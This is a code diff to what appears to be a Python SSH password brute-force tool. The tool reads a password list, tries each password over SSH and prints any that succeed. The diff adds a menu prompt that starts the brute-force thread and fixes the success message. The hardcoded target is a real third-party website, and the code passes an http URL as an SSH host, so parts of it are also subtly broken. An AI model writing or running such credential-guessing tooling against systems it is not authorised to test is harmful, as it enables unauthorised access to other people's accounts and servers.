@@ -14,6 +14,7 @@ class brute_force:
         bf.passwords_bulk = "./Brute Force/passwords.txt"
         bf.single_password = ""
         bf.code = 0
+        bf.state = ""
 
     @staticmethod
     def entry_message():
@@ -37,7 +38,7 @@ class brute_force:
         try:
             ssh.connect(bf.target,port=22, username=bf.username, password=bf.single_password)
             stop_flag = 1
-            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + username)
+            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + bf.username)
         except:
             console.print( '[-] Incorrect login, the password doesn\'t match: ' + bf.single_password)
         ssh.close()
@@ -64,7 +65,12 @@ class brute_force:
         bf.entry_message()
         bf.username = "test"
         bf.target = "http://www.ynet.co.il"
-        bf.ssh_thread()
+        bf.state = input("Please enter your option")
+        if(bf.state == '1'):
+            bf.ssh_thread()
+        else:
+            bf.init_main()
+            print("Incorrect Input, Please try again")
 
 if __name__ == "__main__":
     network_scan = brute_force()
